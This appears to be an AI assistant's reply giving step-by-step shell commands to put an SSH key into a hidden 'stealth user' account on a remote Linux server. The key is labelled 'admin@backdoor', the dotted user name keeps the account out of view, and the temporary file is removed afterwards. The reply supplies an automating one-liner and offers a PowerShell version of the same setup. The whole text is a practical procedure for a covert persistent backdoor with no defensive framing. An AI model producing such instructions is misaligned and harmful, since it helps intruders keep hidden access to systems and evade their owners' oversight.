Here’s how you can **automatically copy your SSH public key** to a remote Linux system’s **stealth user** (e.g., `._svcuser`) using `scp` and `ssh`.

---
## 🧰 Prerequisites
- You’ve already generated your key pair using:
    `ssh-keygen -t rsa -b 4096 -C "admin@backdoor"`
- Your public key is stored at (example):
    `C:\Users\<you>\.ssh\.svcadmin_id_rsa.pub`
- You have SSH access to the target server (with a known user like `root` or `ubuntu`).
---
## ✅ Copy SSH Public Key with `scp`
### 💡 Step-by-Step
#### 1. **Copy the public key to the server using `scp`**
From Git Bash or WSL terminal:
`scp ~/.ssh/.svcadmin_id_rsa.pub youruser@<remote_ip>:/tmp/svcadmin.pub`

Example:
`scp ~/.ssh/.svcadmin_id_rsa.pub root@192.168.10.42:/tmp/svcadmin.pub`

#### 2. **SSH into the server and place the key**
`ssh root@192.168.10.42`

Then run:
```bash
# Create .ssh directory for the stealth user
mkdir -p /home/._svcuser/.ssh
chmod 700 /home/._svcuser/.ssh

# Move the key
cat /tmp/svcadmin.pub >> /home/._svcuser/.ssh/authorized_keys
chmod 600 /home/._svcuser/.ssh/authorized_keys
chown -R ._svcuser: /home/._svcuser/.ssh

# Clean up
rm /tmp/svcadmin.pub
```

---
### 🚀 Test Login
Now from your Windows machine (using Git Bash/WSL):
`ssh -i ~/.ssh/.svcadmin_id_rsa ._svcuser@192.168.10.42`

> Use the exact private key you generated.
---
## ✅ Optional: Automate Step 2 Remotely (One-liner)
```bash
ssh root@192.168.10.42 'mkdir -p /home/._svcuser/.ssh && cat /tmp/svcadmin.pub >> /home/._svcuser/.ssh/authorized_keys && chmod 600 /home/._svcuser/.ssh/authorized_keys && chmod 700 /home/._svcuser/.ssh && chown -R ._svcuser: /home/._svcuser/.ssh && rm /tmp/svcadmin.pub'
```

---

Would you like a complete Windows `.bat` or `.ps1` PowerShell script for this too?
[[5setupstealthkeyps]]